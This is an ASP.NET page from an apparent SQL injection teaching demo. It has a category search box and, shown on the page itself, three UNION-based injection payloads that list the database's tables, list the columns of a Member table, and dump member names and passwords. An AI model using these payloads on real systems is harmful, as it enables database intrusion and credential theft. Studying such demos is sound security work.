<%@ Page Title="" Language="C#" MasterPageFile="~/Site.Master" AutoEventWireup="true" CodeBehind="Categories.aspx.cs" Inherits="WebApp.SQL_Injection_Demo.Categories" %>
<asp:Content ID="Content1" ContentPlaceHolderID="HeadContent" runat="server">
</asp:Content>
<asp:Content ID="Content2" ContentPlaceHolderID="MainContent" runat="server">
    <div>
        <table>
            <tr>
                <td colspan="2">Tim kiem</td>
            </tr>
            <tr>
                <td>Name: </td>
                <td><asp:TextBox runat="server" ID="txtName"></asp:TextBox></td>
            </tr>
            <tr>
                <td>&nbsp;</td>
                <td><asp:Button runat="server" ID="btnSearch" onclick="btnSearch_Click" Text="Search" /></td>
            </tr>
        </table>
        <div>
            <div class="failureNotification">Lay Thong tin cac table</div>
            Sql injection example: name = No' UNION
                    SELECT '-1' as CategoryID, TABLE_NAME as [Name], 
                    TABLE_NAME as [Description], '-1' as [ParentID] , 'False' as [IsActive] FROM INFORMATION_SCHEMA.TABLES --
        </div>
        <div>            
            <div class="failureNotification">Lay thong tin bang Member</div>
            name = No'
            UNION SELECT '-1' as CategoryID, COLUMN_NAME as [Name], 
            COLUMN_NAME as [Description], '-1' as [ParentID] , 'False' as [IsActive] FROM INFORMATION_SCHEMA.COLUMNS 
            WHERE TABLE_NAME = 'Member'--
        </div>

        <div>
            <div class="failureNotification">Lay toan bo thong tin thanh vien member</div>
            name = No' UNION SELECT '-1' as CategoryID, [Name], Password as [Description], '-1' as [ParentID] , 'False' as [IsActive] FROM Member --
        </div>

        <table class="list">
                <tr>
                    <th>Name</th>
                    <th>Parent</th>
                    <th>Is Active</th>
                    <th>Descrition</th>            
                    <th>ID</th>
                </tr>           
                <asp:Repeater runat="server" ID="repCategories" >
                    <ItemTemplate>
                        <tr <%#Container.ItemIndex%2 == 0? "class='even'":"" %>>                            
                            <td>
                                <asp:LinkButton runat="server" ID="lnkUpdate" Text='<%#Eval("Name") %>' CommandName="edit" ToolTip="Update" ></asp:LinkButton>
                            </td>
                            <td><%#Eval("ParentID")%></td>
                            <td><%#Eval("IsActive")%></td>
                            <td><%#Eval("Description")%></td>
                            <td class="id"><%#Eval("CategoryID")%></td>
                        </tr>                             
                    </ItemTemplate>                
                </asp:Repeater>
            </table>
    </div>
</asp:Content>
